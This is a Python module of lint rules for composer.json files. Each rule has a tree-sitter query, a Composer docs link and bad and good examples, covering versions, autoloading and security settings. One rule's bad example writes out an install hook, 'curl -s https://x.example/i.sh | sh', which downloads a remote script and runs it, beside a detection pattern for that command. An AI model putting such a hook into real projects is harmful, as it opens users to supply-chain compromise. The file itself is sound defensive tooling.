"""composer.json pack (getcomposer.org schema, config and versions docs). Layered on the generic JSON pack."""
from specs._common import Pack

SCH = "https://getcomposer.org/doc/04-schema.md"
CFG = "https://getcomposer.org/doc/06-config.md"
VER = "https://getcomposer.org/doc/articles/versions.md"
P = Pack("COMPOSER", "json", "Composer 2.10 docs", {"any": "*"}, files=["**/composer.json"])


def top(key, value):
    return f'(document (object (pair key: (string (string_content) @k (#eq? @k "{key}")) value: {value})))'


def cfg(key, value):
    return f'(document (object (pair key: (string (string_content) @c (#eq? @c "config")) value: (object (pair key: (string (string_content) @k (#eq? @k "{key}")) value: {value})))))'


REQ = lambda pred, sect='"^require(-dev)?$"': (f'(document (object (pair key: (string (string_content) @s (#match? @s {sect})) value: (object (pair key: (string (string_content) @pkg) '
                                               f'value: (string (string_content) @match {pred}))))))')

P("NAME-INVALID", "Package name does not match vendor/project format", SCH, "The name must be lowercase and consist of words separated by",
  top("name", '(string (string_content) @match (#not-match? @match "^[a-z0-9]([_.-]?[a-z0-9]+)*/[a-z0-9](([_.]|-{1,2})?[a-z0-9]+)*$"))'),
  '{"name": "Acme/MyLib"}', '{"name": "acme/my-lib"}', "Composer names are lowercase vendor/project.", sev="major", kind="best-practice", cat="manifest")
P("VERSION-FIELD", "Explicit `version` field", SCH, "In most cases this is not required and should be omitted",
  top("version", "(string) @match"), '{"name": "acme/lib", "version": "1.2.0"}', '{"name": "acme/lib"}',
  "Let Composer infer the version from VCS tags; a hard-coded version drifts from tags and breaks Packagist.", sev="minor",
  kind="best-practice", cat="manifest")
P("NO-LICENSE", "Library without a license", SCH, "Optional, but it is highly recommended to supply this.",
  top("name", "(string) @match"), '{"name": "acme/lib", "type": "library"}', '{"name": "acme/lib", "license": "MIT"}',
  "Declare an SPDX license (or \"proprietary\").", sev="info", kind="best-practice", cat="manifest",
  filters=[r'file.lacks_re:"license"\s*:', r'file.lacks_re:"type"\s*:\s*"project"'])
P("MIN-STABILITY-INVALID", "Invalid minimum-stability", SCH, "Available options (in order of stability) are dev , alpha , beta , RC , and stable",
  top("minimum-stability", '(string (string_content) @match (#not-match? @match "^(dev|alpha|beta|RC|stable)$"))'),
  '{"minimum-stability": "unstable"}', '{"minimum-stability": "stable"}', "Use one of dev, alpha, beta, RC, stable.", sev="major",
  kind="anti-pattern", cat="manifest")
P("MIN-STABILITY-DEV", "minimum-stability dev without prefer-stable", SCH, "When this is enabled, Composer will prefer more stable packages over unstable ones",
  top("minimum-stability", '(string (string_content) @match (#match? @match "^(dev|alpha|beta)$"))'), '{"minimum-stability": "dev"}',
  '{"minimum-stability": "dev", "prefer-stable": true}', "Without prefer-stable every dependency may resolve to dev/alpha releases.",
  sev="major", kind="anti-pattern", cat="dependencies", filters=[r'file.lacks_re:"prefer-stable"\s*:\s*true'])
P("REQ-STAR", "Dependency constraint * (any version)", VER, "Be careful when using unbounded ranges", REQ('(#match? @match "^\\\\*$")'),
  '{"require": {"monolog/monolog": "*"}}', '{"require": {"monolog/monolog": "^3.9"}}', "`*` accepts every future major release.", sev="major", cat="dependencies",
  filters=[r"cap.lacks_re:pkg:^(php|php-64bit|php-ipv6|php-zts|php-debug|hhvm|composer|composer-plugin-api|composer-runtime-api)$|^(ext|lib)-"])  # platform packages (php, ext-*, lib-*): "*" only asks for the extension to be present
P("REQ-UNBOUNDED", "Unbounded >= constraint", VER, "Be careful when using unbounded ranges as you might end up unexpectedly installing versions that break backwards compatibility.",
  REQ('(#match? @match "^>=?\\\\s*[0-9][^,| <]*$")'), '{"require": {"guzzlehttp/guzzle": ">=7.0"}}', '{"require": {"guzzlehttp/guzzle": "^7.0"}}',
  "Use the caret operator (^7.0) so a future major cannot be installed.", sev="minor", cat="dependencies",
  filters=[r"cap.lacks_re:pkg:^(php|php-64bit|php-ipv6|php-zts|php-debug|hhvm|composer|composer-plugin-api|composer-runtime-api)$|^(ext|lib)-"])
P("REQ-DEV-BRANCH", "Requires a dev-* branch", VER, "you need to point it to the branch using the special dev-* prefix",
  REQ('(#match? @match "^dev-|[.]x-dev$")', '"^require$"'), '{"require": {"acme/lib": "dev-main"}}', '{"require": {"acme/lib": "^2.1"}}',
  "A moving branch is not reproducible and silently pulls unreleased code.", sev="major", cat="dependencies")
P("REQ-STABILITY-FLAG", "Inline @dev/@alpha stability flag", SCH, "\"acme/foo\" : \"@dev\"", REQ('(#match? @match "@(dev|alpha|beta)$")', '"^require$"'),
  '{"require": {"acme/foo": "@dev"}}', '{"require": {"acme/foo": "^1.0"}}', "Stability flags in production requirements allow unstable releases.",
  sev="minor", cat="dependencies")
P("PHP-EOL", "require.php allows end-of-life PHP versions", "https://www.php.net/supported-versions.php", "the branch reaches its end of life and is no longer supported",
  '(document (object (pair key: (string (string_content) @s (#eq? @s "require")) value: (object (pair key: (string (string_content) @p (#eq? @p "php")) value: (string (string_content) @match (#match? @match "^[\\\\^~>= ]*(5|7|8[.][01])([.]|$| |[|])")))))))',
  '{"require": {"php": ">=7.4"}}', '{"require": {"php": "^8.3"}}', "The PHP constraint admits branches without security support.",
  sev="minor", kind="modernization", cat="runtime", docv="php.net supported versions (2026-10)")
P("PSR0-AUTOLOAD", "PSR-0 autoloading", SCH, "PSR-4 is the recommended way since it offers greater ease of use",
  '(pair key: (string (string_content) @a (#match? @a "^autoload(-dev)?$")) value: (object (pair key: (string (string_content) @match (#eq? @match "psr-0")))))',
  '{"autoload": {"psr-0": {"Acme_": "src/"}}}', '{"autoload": {"psr-4": {"Acme\\\\": "src/"}}}', "Migrate to PSR-4.", sev="minor", kind="modernization", cat="autoload")
P("TARGET-DIR", "Deprecated target-dir", SCH, "This is only present to support legacy PSR-0 style autoloading", top("target-dir", "(_) @match"),
  '{"target-dir": "Symfony/Component/Yaml"}', '{"autoload": {"psr-4": {"Symfony\\\\Component\\\\Yaml\\\\": ""}}}', "target-dir is deprecated; use PSR-4.",
  sev="minor", kind="deprecation", cat="autoload")
P("INCLUDE-PATH", "Deprecated include-path", SCH, "This is only present to support legacy projects, and all new code should preferably use autoloading.",
  top("include-path", "(_) @match"), '{"include-path": ["lib/"]}', '{"autoload": {"classmap": ["lib/"]}}', "include-path is deprecated; use autoloading.",
  sev="minor", kind="deprecation", cat="autoload")
P("SECURE-HTTP-OFF", "secure-http disabled", CFG, "If set to true only HTTPS URLs are allowed to be downloaded via Composer.", cfg("secure-http", "(false) @match"),
  '{"config": {"secure-http": false}}', '{"config": {"secure-http": true}}', "Allowing HTTP downloads permits tampered packages.", sev="critical",
  kind="security", cat="security")
P("DISABLE-TLS", "disable-tls enabled", CFG, "Enabling this is a security risk and is NOT recommended.", cfg("disable-tls", "(true) @match"),
  '{"config": {"disable-tls": true}}', '{"config": {"disable-tls": false}}', "All HTTPS downloads fall back to unencrypted HTTP.", sev="critical",
  kind="security", cat="security")
P("ALLOW-ALL-PLUGINS", "allow-plugins: true (every plugin may run code)", CFG, "the allow-plugins option adds a layer of security", cfg("allow-plugins", "(true) @match"),
  '{"config": {"allow-plugins": true}}', '{"config": {"allow-plugins": {"composer/installers": true}}}',
  "Allow-list plugins by name; `true` lets any (transitively installed) plugin execute code.", sev="major", kind="security", cat="security",
  applies={"composer": ">=2.2"})
P("ALLOW-PLUGINS-WILDCARD", "allow-plugins wildcard pattern", CFG, "the allow-plugins option adds a layer of security",
  cfg("allow-plugins", '(object (pair key: (string (string_content) @match (#match? @match "[*]")) value: (true)))'),
  '{"config": {"allow-plugins": {"*": true}}}', '{"config": {"allow-plugins": {"composer/installers": true}}}',
  "A wildcard allow-list defeats plugin pinning.", sev="major", kind="security", cat="security", applies={"composer": ">=2.2"})
P("AUTH-IN-COMPOSER-JSON", "Credentials stored in composer.json config", CFG, "A list of domain names and oauth keys.",
  '(document (object (pair key: (string (string_content) @c (#eq? @c "config")) value: (object (pair key: (string (string_content) @match (#match? @match "^(github-oauth|gitlab-oauth|gitlab-token|bitbucket-oauth|http-basic|bearer|forgejo-token)$")) value: (object (pair)))))))',
  '{"config": {"github-oauth": {"github.com": "ghp_xxx"}}}', '{"config": {"github-protocols": ["https"]}}',
  "Tokens in composer.json are committed; use auth.json (not committed) or COMPOSER_AUTH.", sev="critical", kind="security", cat="security")
P("BLOCK-INSECURE-DEPRECATED", "Deprecated config.block-insecure", CFG, "Deprecated. Use config.policy.advisories.block instead.",
  '(document (object (pair key: (string (string_content) @c (#eq? @c "config")) value: (object (pair key: (string (string_content) @k (#eq? @k "audit")) value: (object (pair key: (string (string_content) @match (#eq? @match "block-insecure")))))))))',
  '{"config": {"audit": {"block-insecure": true}}}', '{"config": {"policy": {"advisories": {"block": true}}}}', "Use config.policy.advisories.block.",
  sev="minor", kind="deprecation", cat="security", applies={"composer": ">=2.10"})
P("BLOCK-INSECURE-OFF", "Security-advisory blocking disabled", CFG, "any package versions affected by security advisories will be blocked",
  '(document (object (pair key: (string (string_content) @c (#eq? @c "config")) value: (object (pair key: (string (string_content) @k (#match? @k "^(audit|policy)$")) value: (object (pair key: (string (string_content) @b (#match? @b "^(block-insecure|advisories)$")) value: [(false) @match (object (pair key: (string (string_content) @x (#eq? @x "block")) value: (false) @match))])))))))',
  '{"config": {"audit": {"block-insecure": false}}}', '{"config": {"audit": {"block-insecure": true}}}',
  "Turning off advisory blocking lets known-vulnerable versions be installed.", sev="major", kind="security", cat="security")
P("REPO-HTTP", "Repository URL over http://", CFG, "If set to true only HTTPS URLs are allowed to be downloaded via Composer.",
  '(pair key: (string (string_content) @r (#eq? @r "repositories")) value: (_ (object (pair key: (string (string_content) @u (#eq? @u "url")) value: (string (string_content) @match (#match? @match "^http://"))))))',
  '{"repositories": [{"type": "composer", "url": "http://repo.internal"}]}', '{"repositories": [{"type": "composer", "url": "https://repo.internal"}]}',
  "Packages fetched over HTTP can be tampered with.", sev="critical", kind="security", cat="security")
P("DEVTOOL-IN-REQUIRE", "Dev/test tooling in require", SCH, "Map of packages required for developing this package, or running tests, etc.",
  REQ('', '"^require$"').replace("@pkg)", '@match (#match? @match "^(phpunit/phpunit|mockery/mockery|phpstan/phpstan|vimeo/psalm|friendsofphp/php-cs-fixer|squizlabs/php_codesniffer|rector/rector|pestphp/pest|fakerphp/faker|symfony/var-dumper|barryvdh/laravel-debugbar|nunomaduro/collision)$"))').replace("(string_content) @match )", "(string_content))"),
  '{"require": {"phpunit/phpunit": "^12.0"}}', '{"require-dev": {"phpunit/phpunit": "^12.0"}}',
  "Test/static-analysis tools belong in require-dev so production installs (--no-dev) skip them.", sev="minor", cat="dependencies",
  mode="ai-confirm", ai="Is this package only needed for development/testing (not used by production code paths)?")
P("REQ-DUPLICATED", "Package in both require and require-dev", SCH, "Map of packages required for developing this package",
  '(document (object (pair key: (string (string_content) @a (#eq? @a "require")) value: (object (pair key: (string) @d))) (pair key: (string (string_content) @b (#eq? @b "require-dev")) value: (object (pair key: (string) @match))) (#eq? @d @match)))',
  '{"require": {"psr/log": "^3"}, "require-dev": {"psr/log": "^3"}}', '{"require": {"psr/log": "^3"}}', "Keep each package in one section.",
  sev="minor", cat="dependencies")
P("SCRIPT-REMOTE-EXEC", "Composer script pipes a download into a shell", "https://getcomposer.org/doc/articles/scripts.md", "A script, in Composer's terms",
  '(pair key: (string (string_content) @s (#eq? @s "scripts")) value: (object (pair value: [(string (string_content) @match) (array (string (string_content) @match))] (#match? @match "(curl|wget)[^|]*[|]\\\\s*(ba|z)?sh"))))',
  '{"scripts": {"post-install-cmd": "curl -s https://x.example/i.sh | sh"}}', '{"scripts": {"post-install-cmd": "@php bin/setup.php"}}',
  "Install hooks that execute remote scripts are a supply-chain risk.", sev="critical", kind="security", cat="security")
P("OPTIMIZE-AUTOLOADER", "Project without optimize-autoloader", CFG, "If true , always optimize when dumping the autoloader.",
  top("type", '(string (string_content) @match (#eq? @match "project"))'), '{"type": "project", "config": {}}',
  '{"type": "project", "config": {"optimize-autoloader": true}}', "Applications should ship an optimized (classmap) autoloader.",
  sev="info", kind="best-practice", cat="performance", filters=[r'file.lacks_re:"optimize-autoloader"\s*:\s*true|"classmap-authoritative"\s*:\s*true'])
P("ABANDONED-TRUE-NO-REPLACEMENT", "abandoned: true without a replacement", SCH, "It can be boolean or a package name/URL pointing to a recommended alternative.",
  top("abandoned", "(true) @match"), '{"abandoned": true}', '{"abandoned": "monolog/monolog"}', "Point users at the replacement package.",
  sev="info", kind="best-practice", cat="manifest")
RULES = P.R
